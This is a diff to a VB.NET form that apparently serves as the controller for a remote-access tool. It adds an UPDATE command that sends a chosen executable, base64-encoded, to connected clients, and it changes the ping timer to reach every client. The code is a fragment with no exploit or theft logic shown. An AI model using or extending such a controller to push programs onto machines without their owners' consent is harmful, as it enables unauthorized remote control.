@@ -27,11 +27,9 @@ Public Class Form1
 
     End Sub
 
-    Private Sub CloseClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseClientToolStripMenuItem.Click
+    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
-
-
                 Dim B As Byte() = SB("CLOSE")
                 For Each C As ListViewItem In LV1.SelectedItems
                     Dim x As Client = CType(C.Tag, Client)
@@ -40,6 +38,33 @@ Public Class Form1
                     Catch ex As Exception
                     End Try
                 Next
+            Catch ex As Exception
+            End Try
+        End If
+    End Sub
+
+    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
+        If LV1.SelectedItems.Count > 0 Then
+            Try
+
+                Dim o As New OpenFileDialog
+                With o
+                    .Filter = "(*.exe)|*.exe"
+                    .Title = "Update Client"
+                End With
+
+                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                    Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
+
+                    For Each C As ListViewItem In LV1.SelectedItems
+                        Dim x As Client = CType(C.Tag, Client)
+
+                        Try
+                            x.Send(B)
+                        Catch ex As Exception
+                        End Try
+                    Next
+                End If
             Catch ex As Exception
             End Try
         End If
@@ -101,12 +126,12 @@ Public Class Form1
         End Try
     End Sub
 
-    Private Async Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
+    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
         If LV1.Items.Count > 0 Then
             Try
 
                 Dim B As Byte() = SB("PING!")
-                For Each C As ListViewItem In LV1.SelectedItems
+                For Each C As ListViewItem In LV1.Items
                     Dim x As Client = CType(C.Tag, Client)
                     Try
                         x.Send(B)
@@ -133,23 +158,5 @@ Public Class Form1
         Catch ex As Exception
         End Try
     End Sub
-
-
-    'Private mouseDownLV1 As Boolean
-    'Private Sub LV1_MouseDown(sender As Object, e As MouseEventArgs) Handles LV1.MouseDown
-    '    mouseDownLV1 = True
-    'End Sub
-
-    'Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
-    '    If mouseDownLV1 Then
-    '        Try
-    '            LV1.Items(LV1.HitTest(e.Location).Item.Index).Selected = True
-    '        Catch : End Try
-    '    End If
-    'End Sub
-
-    'Private Sub LV1_MouseUp(sender As Object, e As MouseEventArgs) Handles LV1.MouseUp
-    '    mouseDownLV1 = False
-    'End Sub
 
 End Class
